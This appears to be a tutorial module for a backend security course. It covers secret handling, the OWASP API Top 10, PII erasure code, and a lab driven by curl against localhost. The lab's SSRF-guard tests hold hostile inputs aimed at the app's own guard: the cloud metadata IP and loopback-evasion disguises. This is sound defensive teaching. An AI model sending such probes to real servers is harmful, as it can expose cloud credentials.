          body: `TWELVE-FACTOR CONFIG, the rule this repo's shape follows: everything that differs between environments (database paths, ports, log levels, and every CREDENTIAL) lives in ENVIRONMENT VARIABLES read at boot — code stays identical from laptop to prod, and a secret never needs to exist in a source file to be used. The .env files here (server/.env.development, -staging, -production, selected by NODE_ENV via dotenv) are the dev-ergonomics spelling of that rule. THE GITIGNORE TRUTH, stated honestly because a wrong claim here costs someone their AWS key: the rule is .env* in .gitignore BEFORE the first real secret exists — a secret committed once is in history forever (deleting the file later does not delete the clones, the mirrors, or the CI caches), and the remediation is rotation, not deletion. This repo's .gitignore covers build output and data but does NOT yet list .env* — currently harmless because the env files hold only non-secret port/path config and every "secret" in the tree (whsec_teaching_demo, gsk_demo_… keys, the JWT teaching secret) is a NAMED-BY-DESIGN placeholder, exactly so the lesson can be taught on values that are safe to leak. The day this app talks to anything real, that gitignore line lands first. THE NAMING tells you what you're looking at: real secrets arrive via env (process.env/SESSION_SECRET, MONGO_URI…), demo values carry their fakeness in their name — a convention worth copying, because it lets code review spot a real credential in source INSTANTLY. NEVER LOG SECRETS: logs are the leak channel people forget — they ship to aggregators, get grepped by support, and outlive the incident. This app's discipline is masking at the source (session tokens appear only as …last4 everywhere, the session list masks, nothing logs bodies of auth requests) — and the tool layer to know: pino supports redact paths (logger = pino({ redact: ['req.headers.authorization', 'req.headers.cookie', '*.token'] })) which strips the listed keys from every logged object; this app has not needed it because nothing sensitive is ever PUT in a log line, which is the stronger order of operations — redaction is the seatbelt, not the license. ROTATION, briefly, because it is the competency everyone lacks until an incident: store HASHES of client secrets, never the secrets (verify by hashing the presented value — the demo API keys do this), so a database dump cannot be replayed; give every credential a VERSIONED identity (kid in JWT headers, key ids in webhook secrets) so old and new validate SIMULTANEOUSLY during a rollover window; issue the new key, dual-verify through the transition, retire the old one — and when a secret does leak, the rotated key must also invalidate every derived artifact (sessions minted under the old signing key, codes bound to the old client secret). Break-glass: a rotation runbook written BEFORE the incident, tested once, is the difference between a 10-minute key change and a 3am shutdown.`,
        },
      ],
    },
    {
      id: 'security-owasp',
      title: 'OWASP API Security Top 10 — mapped to this app',
      lead:
        "The industry's checklist of how APIs actually get breached, one line each — with where this guide demonstrates the defense, and where it honestly does not.",
      blocks: [
        {
          kind: 'text',
          id: 'security-owasp:ten',
          body: `API1 BROKEN OBJECT LEVEL AUTHORIZATION — the request names an object; nothing checks the CALLER may touch THAT one (IDOR, the #1 real-world API breach). Demonstrated: the authz topic's requireDocumentOwnerOrPermission — owner-or-permission per document, 401→404→403 ordering, spec-tested. API2 BROKEN AUTHENTICATION — weak tokens, no expiry, verifiable error differences, brute-forceable endpoints. Demonstrated: the authentication topic (expiry + signature checks, constant-time compares, unknown-username dummies) and this topic's login-friendly rate limits. API3 BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION — the client may not SET every property it can SEND: mass assignment (POST /users with role:"admin") and over-exposure (returning passwordHash in the list response). Demonstrated in half: this app's inputs are validated fixed-shape DTOs (validation topic — unknown fields rejected, exactly-typed outputs), and the honest other half is that the demo DTOs are simple enough that the failure needs imagining: the rule to carry away is OUTPUT allowlists (serialize named fields, never spread the row) and INPUT allowlists (never bind the request body straight onto a model). API4 UNRESTRICTED RESOURCE CONSUMPTION — unbounded requests: no rate limits, no page sizes, no payload caps, expensive endpoints on demand. Demonstrated: this topic's two limiters; honestly OPEN: GET /api/posts is unpaginated (taught as a gap in the api-design topic — the fix is the cursor/limit+page pattern there). API5 BROKEN FUNCTION LEVEL AUTHORIZATION — the ADMIN route guarded by nothing, or by a client-side check, or by an env flag instead of an identity. Demonstrated: requirePermission('admin:demos') on the admin-only demo route — deny-by-default RBAC as data. API6 UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS — not a broken check but an ABUSABLE flow: ticket scalping, signup-bonus farming, vote brigading; the defense is detection + friction + limits on the FLOW, not on the request. Honest status: not demonstrated — a teaching app has no flows worth abusing; know the name so you recognize it when your product does. API7 SSRF — the server fetches client-chosen URLs (covered above at length). Demonstrated: the ssrf-guard endpoint's verdict chain, evasion classes named. API8 SECURITY MISCONFIGURATION — verbose errors, permissive CORS, missing headers, debug endpoints in prod, default credentials. Demonstrated: helmet app-wide + the pinned CSP, the error envelope that never leaks stacks, x-powered-by disabled, CORS as an allowlist. API9 IMPROPER INVENTORY MANAGEMENT — forgotten endpoints, stale versions, hosts nobody owns; attackers love /api/v1 that "we deprecated" in 2021 and never turned off. Demonstrated: the OpenAPI document as the living inventory, with drift-check SPECS that fail when the served surface and the documented surface disagree. API10 UNSAFE CONSUMPTION OF APIs — the mirror-image blind spot: YOUR code is the CLIENT of third parties and inbound webhooks, and you trust their responses like a colleague. Demonstrated: the webhooks topic's receiver (verify HMAC over raw bytes BEFORE parsing, replay window, treat the payload as untrusted until proven), and the same skepticism applied to every outbound call this app makes. READ THE LIST AS A REVIEW SCRIPT, not trivia: paste your route table next to it and answer per row "where is the object check, the input allowlist, the limit, the inventory entry?" — the rows you cannot answer ARE your backlog.`,
        },
      ],
    },
    {
      id: 'security-pii',
      title: 'PII, retention & GDPR-style deletion',
      lead: 'Personal data is a liability you are holding for someone else: it must be findable (access/export), deletable (erasure), and finite (retention). The counterintuitive core: GDPR-style deletion usually should NOT delete the row — it anonymizes it, because the order history is not "the person" and must keep working.',
      blocks: [
        {
          kind: 'text',
          id: 'security-pii:lifecycle',
          body: `THE OBLIGATIONS, in the shape a backend owns. RIGHT OF ACCESS: a person can ask "everything you hold about me", and the answer must be a COMPLETE, machine-readable export — not just the users row: linked orders, addresses, support tickets, the audit entries naming them. "Everything" is the compliance bar; an export that forgets one table fails the audit, which is why the demo's export handler gathers the subject, the linked records, and any erasure record in one document. RIGHT OF ERASURE is where intuition misfires: "delete the user row" breaks everything pointing at it — the orders orphan, historical totals stop adding up, the auditor's trail dangles (and invoices, legally, must often SURVIVE deletion). The production pattern is CRYPTO-SHRED ANONYMIZATION: keep the row and its foreign keys, overwrite every PII field with a one-way placeholder — the row still resolves, joins still work, the IDENTITY is gone. "Crypto-shred" because the honest strong form derives the placeholders from a per-customer key that is DESTROYED on erasure (encrypt PII at rest per-customer, drop the key, recovery becomes computationally impossible); the demo implements the lighter form — deterministic anon_<sha256-prefix> placeholders — and says so, because a placeholder derived from a PUBLIC id is still unique and stable but not secret; the step-up is the pepper. ERASE MUST ALSO BE IDEMPOTENT and ACCOUNTED: a second erasure of an already-anonymous row is not an error (the outcome already holds), and every erasure lands in an ERASURE LOG — who, when, what scope, how many linked records were kept — because "prove you deleted it" is a regulator question answered with a record, not a shrug. RETENTION is the policy that prevents the pile: every PII class deserves a stated lifetime (sessions: 30 days; telemetry: 60 seconds — the Mongo topic's TTL index is exactly this; exported data: the ticket's lifetime), because data you no longer hold cannot leak, cannot be subpoenaed, and cannot be breached. And the two tensions worth naming honestly: the AUDIT TRAIL vs erasure (old_values snapshots in an audit log ARE PII-adjacent — retention policy must cover the trail explicitly, or anonymization must reach into it), and BACKUPS vs erasure (erasure does not rewrite yesterday's backup; the workable answers are documented backup lifetimes plus re-erasure on restore, or encryption-per-customer so restoring a dead key's data yields ciphertext). The demo below makes the whole lifecycle watchable: export a customer, anonymize them, read the after-state (row alive, identity gone, orders intact), and read the log regulators ask for.`,
        },
        {
          kind: 'code',
          id: 'security-pii:verbatim-scope',
          language: 'ts',
          source: 'server/src/domain/demo/pii_erasure_service.ts',
          caption:
            'Verbatim — the erasure SCOPE and the placeholder function (domain/demo/pii_erasure_service.ts, the policy the pii routes call): which fields are PII, stated up front',
          code: `/** The PII-bearing fields the anonymizer overwrites (scope, stated up front). */
const PII_FIELDS = [
  'name',
  'email',
  'phone',
  'address.line1',
  'address.city',
  'address.postalCode',
  'address.country',
] as const;

/** Deterministic, clearly-fake placeholder: anon_<first 8 hex of sha256(id:field)>. */
function anonPlaceholder(customerId: string, field: string): string {
  return \`anon_\${createHash('sha256').update(\`\${customerId}:\${field}\`, 'utf8').digest('hex').slice(0, 8)}\`;
}`,
        },
        {
          kind: 'code',
          id: 'security-pii:verbatim-shred',
          language: 'ts',
          source: 'server/src/domain/demo/pii_erasure_service.ts',
          caption:
            'Verbatim — the crypto-shred write and the erasure-log entry (domain/demo/pii_erasure_service.ts — the policy extracted out of the route handler, because business logic belongs in the domain): every PII field overwritten, the row and its FKs KEPT',
          code: `  // CRYPTO-SHRED: overwrite every PII field with its one-way placeholder.
  customer.name = anonPlaceholder(customer.id, 'name');
  customer.email = \`\${anonPlaceholder(customer.id, 'email')}@erased.invalid\`;
  customer.phone = anonPlaceholder(customer.id, 'phone');
  customer.address = {
    line1: anonPlaceholder(customer.id, 'address.line1'),
    city: anonPlaceholder(customer.id, 'address.city'),
    postalCode: anonPlaceholder(customer.id, 'address.postalCode'),
    country: anonPlaceholder(customer.id, 'address.country'),
  };
  const anonymizedAt = new Date().toISOString();
  customer.anonymizedAt = anonymizedAt;

  const linkedOrdersKept = this.store.countLinkedOrders(customer.id);
  this.store.recordErasure({
    customerId: customer.id,
    anonymizedAt,
    performedBy: 'gdpr-erasure-demo',
    scope: [...PII_FIELDS],
    method: 'crypto-shred placeholders; row + foreign keys kept (order history survives)',
    linkedOrdersKept,
  });`,
        },
        {
          kind: 'demo',
          id: 'security-pii:demo',
          demoId: 'security:pii',
          title: 'The PII erasure lab',
          description:
            'Four rights over a seeded customer fixture: EXPORT everything one person\'s records join into (orders and erasure record included), ANONYMIZE a customer and watch the row survive while its identity is shredded (orders kept, totals intact), READ the after-state, and read the ERASURE LOG — the accounting record a regulator asks for.',
        },
        {
          kind: 'code',
          id: 'security-pii:curl',
          language: 'bash',
          caption: 'The erasure lifecycle from a terminal',
          code: `# right of access: one person, every record, one document:
curl -s localhost:4000/api/demo/security/pii/export/cust_1 \\
  | jq '{subject: .subject.name, linkedOrders: (.linkedOrders | length)}'

# erasure — the row stays, the PII goes:
curl -s -X POST localhost:4000/api/demo/security/pii/anonymize/cust_1 \\
  | jq '{anonymized, customer: {name: .customer.name, email: .customer.email}, linkedOrdersKept}'

# the after-state, honestly reported:
curl -s localhost:4000/api/demo/security/pii/customers/cust_1 \\
  | jq '{customer: {name: .customer.name, anonymizedAt: .customer.anonymizedAt},
         ordersKept: (.orders | length), note}'

# the accounting record:
curl -s localhost:4000/api/demo/security/pii/erasure-log | jq '.entries[0]'`,
        },
      ],
    },
    {
      id: 'security-live',
      title: 'See it live (the security lab)',
      lead:
        'Four panels over real middleware: the headers helmet actually set on YOUR request, a rate limit you can trip in eight clicks, CORS verdicts from the enforcing decision function, and the SSRF guard denying the metadata IP.',
      blocks: [
        {
          kind: 'text',
          id: 'security-live:intro',
          body: `THE LAB'S FOUR PANELS. HEADERS: GET /api/demo/security/headers returns the response headers the CURRENT request actually received — helmet's full set (CSP, HSTS, nosniff, frame options, referrer policy, COOP/CORP…), the request-id middleware's x-request-id, Express's own — rendered as a table with a per-header explainer for the security ones; nothing is simulated, this is the wire. RATE LIMIT: a "send 8 requests" button fires eight sequential GETs at /api/demo/security/ping — the express-rate-limited route (5 per 60s per client ip) — and a row of eight status chips shows 200×5 then 429×3, with the Retry-After and RateLimit-* values pulled from the LAST response and the per-request remaining counts from each body; a second button does three clicks against the HANDMADE twin (3 per 30s) so both algorithms are trippable side by side. The limiters key by CLIENT IP — in the browser that is you, so once tripped, you wait out the window (that's the demo being honest; curl from another machine shows independent budgets). CORS: an origin field (prefilled with the allowed https://example.com and a one-click disallowed default) fires GET /cors-check, which answers with the SAME evaluateCorsOrigin decision the mounted middleware enforces — allowed/denied verdict, the exact Access-Control-Allow-Origin an allowed origin would earn, and the reminder that a denial means NO headers, not an error: the browser is the enforcer. SSRF GUARD: a URL field prefilled with http://169.254.169.254/latest/meta-data/ → the verdict panel shows DENIED with the named reason (link-local — the cloud metadata address); swap to an allowed host (http://httpbin.org/get) → ALLOWED; paste any disguise (0x7f000001, a @userinfo trick, [::ffff:127.0.0.1]) and the guard names the evasion class — and never fetches anything. The curl block below drives the same surface from a terminal, including the preflight the browser would send.`,
        },
        {
          kind: 'demo',
          id: 'security-live:lab-demo',
          demoId: 'security:lab',
          title: 'The security lab: headers, a trippable rate limit, CORS verdicts, the SSRF guard',
          description:
            'Four panels over real middleware: the security headers this very response carries (with per-header explainers), eight sequential pings that watch 200s become 429 + Retry-After, CORS allowed/denied verdicts from the enforcing allowlist function, and the SSRF guard denying the cloud metadata IP by name while allowing allowlisted hosts.',
        },
        {
          kind: 'code',
          id: 'security-live:curl',
          language: 'bash',
          caption: 'The lab from a terminal — headers, the trip, the preflight, the guard',
          code: `# 1. The headers helmet set on this very request (the wire, not a mock):
curl -sD - -o /dev/null localhost:4000/api/demo/security/headers | grep -Ei 'content-security|strict-transport|x-content-type|x-frame|referrer|cross-origin'

# 2. Trip the express-rate-limit route — five 200s, then the 429 envelope:
for i in 1 2 3 4 5 6; do
  curl -s -o /dev/null -w "req $i → %{http_code}  retry-after=%header{retry-after}\\n" \\
    localhost:4000/api/demo/security/ping
done
# req 6 → 429  retry-after=<seconds>   ← and the body is the canonical envelope:
curl -s localhost:4000/api/demo/security/ping | jq '.error | {code, limit, retryAfterSeconds}'

# 2b. The handmade fixed window (3 per 30s) — its own budget:
for i in 1 2 3 4; do
  curl -s -o /dev/null -w "handmade $i → %{http_code}\\n" \\
    localhost:4000/api/demo/security/handmade-ping
done

# 3. CORS: the preflight an allowed origin's browser would send → 204 + ACAO:
curl -s -o /dev/null -w '%{http_code}\\n' -X OPTIONS localhost:4000/api/demo/security/cors-probe \\
  -H 'Origin: http://localhost:5173' -H 'Access-Control-Request-Method: GET' \\
  -D - | grep -i access-control-allow-origin
# …and the same preflight from a disallowed origin: no ACAO line at all.

# 3b. Verdicts from the same decision function the middleware enforces:
curl -s 'localhost:4000/api/demo/security/cors-check?origin=https%3A%2F%2Fexample.com' | jq '{allowed, accessControlAllowOrigin}'
curl -s 'localhost:4000/api/demo/security/cors-check?origin=https%3A%2F%2Fevil.example' | jq '{allowed, accessControlAllowOrigin}'

# 4. The SSRF guard — metadata IP denied by name, disguises named, never a fetch:
curl -s 'localhost:4000/api/demo/security/ssrf-guard?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F' | jq '{allowed, kind, reason}'
curl -s 'localhost:4000/api/demo/security/ssrf-guard?url=http%3A%2F%2F0x7f000001%2F' | jq '{kind, reason}'
curl -s 'localhost:4000/api/demo/security/ssrf-guard?url=http%3A%2F%2Fhttpbin.org%2Fget' | jq '{allowed, reason}'

# 5. The injection catalog (safe/unsafe pairs + this repo's honest status):
curl -s localhost:4000/api/demo/security/injection-samples | jq '.enforced'`,
        },
      ],
    },
  ],
};
